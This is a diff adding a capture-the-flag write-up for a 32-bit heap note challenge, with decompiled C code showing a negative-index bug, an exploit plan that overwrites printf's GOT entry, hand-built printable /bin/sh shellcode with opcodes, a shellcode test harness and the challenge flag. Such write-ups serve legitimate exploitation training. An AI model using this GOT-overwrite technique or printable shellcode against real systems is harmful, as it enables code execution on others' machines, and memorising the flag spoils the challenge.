@@ -3,7 +3,180 @@
 | Description |
 └─────────────┘
 
+main() {
+  int iVar1;
+  setvbuf(stdout,(char *)0x0,2,0);
+  setvbuf(stdin,(char *)0x0,2,0);
+  do {
+    while( true ) {
+      while( true ) {
+        menu();
+        iVar1 = read_int();
+        if (iVar1 != 2) break;
+        show_note();                                         // 2 -> show note()
+      }
+      if (2 < iVar1) break;
+      if (iVar1 == 1) {
+        add_note();                                          // 1 -> add_note()
+      }
+      else {
+LAB_08048a0e:
+        puts("Invalid choice");
+      }
+    }
+    if (iVar1 != 3) {
+      if (iVar1 == 4) {
+        exit(0);                                             // 4 -> exit()
+      }
+      goto LAB_08048a0e;
+    }
+    del_note();                                              // 3 -> del_note()
+  } while( true );
+}
+
+add_note() {
+  int iVar1;
+  int iVar2;
+  char *pcVar3;
+  int in_GS_OFFSET;
+  char name [80];
+  int canary = *(int *)(in_GS_OFFSET + 0x14);
+  printf("Index :");
+  iVar1 = read_int();
+  if (10 < iVar1) {                                          // index must be less than 10 (PROBLEM)
+    puts("Out of bound !!");
+    exit(0);
+  }
+  printf("Name :");
+  read_input(name, 0x50);                                    // Get name 
+  iVar2 = is_printable(name);                                // check if printable
+  if (iVar2 != 0) {
+    pcVar3 = strdup(name);
+    *(char **)(note + iVar1 * 4) = pcVar3;                   // Add name to note
+    puts("Done !");
+    if (canary != *(int *)(in_GS_OFFSET + 0x14)) {
+      __stack_chk_fail();
+    }
+    return;
+  }
+  puts("It must be a printable name !");
+  exit(-1);
+}
+
+undefined4 is_printable(char *param_1) {                     // Checks each character of string is ASCII printable
+  size_t sVar1;
+  uint local_10 = 0;
+  while(true) {
+    sVar1 = strlen(param_1);
+    if (sVar1 <= local_10) {
+      return 1;
+    }
+    if ((param_1[local_10] < ' ') || (param_1[local_10] == '\x7f')) break;
+    local_10 = local_10 + 1;
+  }
+  return 0;
+}
+
+show_note() {
+  int iVar1;
+  printf("Index :");
+  iVar1 = read_int();
+  if (10 < iVar1) {                                          // index must be less 10 (PROBLEM)
+    puts("Out of bound !!");
+    exit(0);
+  }
+  if (*(int *)(note + iVar1 * 4) != 0) {
+    printf("Name : %s\n",*(undefined4 *)(note + iVar1 * 4));
+  }
+  return;
+}
+
+del_note() {
+  int iVar1;
+  printf("Index :");
+  iVar1 = read_int();
+  if (10 < iVar1) {
+    puts("Out of bound !!");
+    exit(0);
+  }
+  free(*(void **)(note + iVar1 * 4));
+  *(undefined4 *)(note + iVar1 * 4) = 0;
+  return;
+}
+
+note 0x0804a060 (48 bytes total)
+
 ┌─────────┐
 | Exploit |
 └─────────┘
+ALSR, Partial RELRO, Canary, 32 bit
 
+Negative buffer indexes into note can be used - for arbitrary write of heap addresses with attacker controlled values
+Index -20 overwrite printf@got.plt Other negative indexes can be used as well
+
+The exploit is straight forward. Simply overwrite GOT with address to the shellcode. The main problem is that the shellcode
+must be printable - 0x20 - 0x7f
+The classic shellcode for execve("/bin/sh") does not work. 
+ 8049000:       31 c0                   xor    %eax,%eax
+ 8049002:       50                      push   %eax
+ 8049003:       68 2f 2f 73 68          push   $0x68732f2f
+ 8049008:       68 2f 62 69 6e          push   $0x6e69622f
+ 804900d:       89 e3                   mov    %esp,%ebx
+ 804900f:       31 c9                   xor    %ecx,%ecx
+ 8049011:       31 d2                   xor    %edx,%edx
+ 8049013:       83 c0 0b                add    $0xb,%eax
+ 8049016:       cd 80                   int    $0x80
+
+So simplify the shellcode to make it printable. Additional constraint is shellcode length limit of 0x50 (80). 
+1. ebx -> /bin/sh
+  push   0x68                \x6a\x68
+	push   0x732f2f2f          \x68\x2f\x2f\x2f\x73
+	push   0x6e69622f          \x68\x2f\x62\x69\x6e
+  push esp                   \x54
+  pop ebx                    \x5b
+
+2. eax -> 0xb
+Register esi is 0x0 at the time of shellcode execution. To set a register to 0x0 push and pop esi to target register
+  push esi                   \x56
+  pop eax                    \x58
+	xor al, 0x20               \x34\x20
+	xor al, 0x2b               \x34\x2b
+
+3. syscall 
+This requires the last values of the shellcode to be \xcd and \x80. Because there is no workaround to this, The shellcode must
+initially write printable values and then rewrite them later.
+xor 0x53, 0x70 with 0x20 0x43 individually to get 0xcd and 0x80 (copied from writeup)
+  push edx
+  pop eax
+  push 0x53
+  pop edx
+  sub byte ptr [eax+39],dl
+  sub byte ptr [eax+40],dl
+  push 0x70
+  pop edx
+  xor byte ptr [eax+40],dl
+
+While the local environment/binary has heap section as non executable the remote environment has heap as executable.
+This creates a problem. So to then properly test the program use the following to test the printable shellcodes.
+```
+// Compile with: gcc -m32 -z execstack shellcode.c
+// Examine shellcode funtionality: gdb -q a.out
+#include<stdio.h>
+#include<string.h>
+
+int main(int argc, char **argv) {
+  unsigned char code[] = "...";                              // <-- Insert shellcodes here to test
+
+  int foo_value = 0;
+  printf("length of the shellcode is: %d\n", (int)sizeof(code)-1);
+
+  int (*foo)() = (int(*)())code;
+  foo_value = foo();
+
+	printf("shellcode execution complete\n");
+	return 0;
+}
+```
+
+
+FLAG{sh3llc0d3_is_s0_b34ut1ful}
